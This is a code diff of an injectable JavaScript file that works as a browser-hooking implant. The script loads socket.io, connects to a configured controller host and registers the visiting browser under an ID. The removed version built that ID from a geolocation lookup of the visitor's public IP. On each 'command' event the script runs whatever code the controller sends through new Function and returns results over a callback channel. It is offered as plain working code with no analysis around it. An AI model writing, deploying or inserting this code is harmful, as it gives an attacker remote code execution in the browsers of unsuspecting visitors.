@@ -1,58 +1,4 @@
-var config = {"ip":"http://?", 'ioport': '3000', 'webport': '3030', "injectjquery": true}, socket, id, dviide;
-(function() {
-  if(config.injectjquery) {
-    injectScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js', true, function() {
-      injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
-        socket = io(config.ip + ':' + config.ioport);
-        afterInject();
-      });
-    });
-  } else {
-    injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
-      socket = io(config.ip + ':' + config.ioport);
-      afterInject();
-    });
-  }
-})();
-
-function dviide(id, ip, ioport, webport, hb) {
-  this.id = id;
-  this.ip = ip;
-  this.ioport = ioport;
-  this.webport = webport;
-  this.hb = hb;
-  this.disconnect = function() {
-   clearInterval(this.hb);
-   socket.close();
-  }
-  this.callback = function(data) {
-    callbackToHost(data);
-  }
-}
-
-function afterInject() {
-  var date = Date();
-  var heartbeatid = setInterval(heartbeat, 1000);
-  dviide = new dviide(id, config.ip, config.ioport, config.webport, heartbeatid);
-  $.getJSON('//freegeoip.net/json/?callback=?', function(data) {
-    id = window.location.hostname.replace(/ /g,'') + "-" + data.ip + "-" + data.country_code + "-" + new Date().getTime();
-    socket.emit("conn", {id:id});
-    socket.on("command", function(data) {
-      var func = new Function(data.script);
-      var module = new func();
-      module.start();
-    });
-  });
-}
-
-function heartbeat() {
-  socket.emit("beat", {id: id});
-}
-
-function callbackToHost(text) {
-  socket.emit("callback", {id: id,data: text + "\n"});
-}
-
+var config = {"ip":"http://192.168.0.164", 'ioport': '3000', 'webport': '3030', "injectjquery": true}, dviide;
 function injectScript(src, url, callback) {
   if(url) {
     var script = document.createElement("SCRIPT");
@@ -66,4 +12,56 @@ function injectScript(src, url, callback) {
   } else {
     eval(src);
   }
+}
+
+function uuid() {
+  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+    s4() + '-' + s4() + s4() + s4();
+}
+
+function s4() {
+  return Math.floor((1 + Math.random()) * 0x10000)
+    .toString(16)
+    .substring(1);
+}
+
+(function() {
+  if(config.injectjquery) {
+    injectScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js', true, function() {
+      injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
+        afterInject();
+      });
+    });
+  } else {
+    injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
+      afterInject();
+    });
+  }
+})();
+
+function dviide() {
+  var date = Date();
+  this.heartbeatid = setInterval(this.heartbeat, 1000);
+  this.socket = io(config.ip + ':' + config.ioport);
+  this.id = uuid();
+  this.socket.emit("conn", {id: this.id});
+  this.socket.on("command", function(data) {
+    var Module = new Function(data.script);
+    var module = new Module();
+    module.start();
+  });
+  this.disconnect = function() {
+    clearInterval(this.heartbeatid);
+    this.socket.close();
+  }
+  this.callback = function(data) {
+    this.socket.emit("callback", {id: this.id, data: data + "\n"});
+  }
+  this.heartbeat = function() {
+    this.socket.emit("beat", {id: this.id});
+  }
+}
+
+function afterInject() {
+  dviide = new dviide();
 }
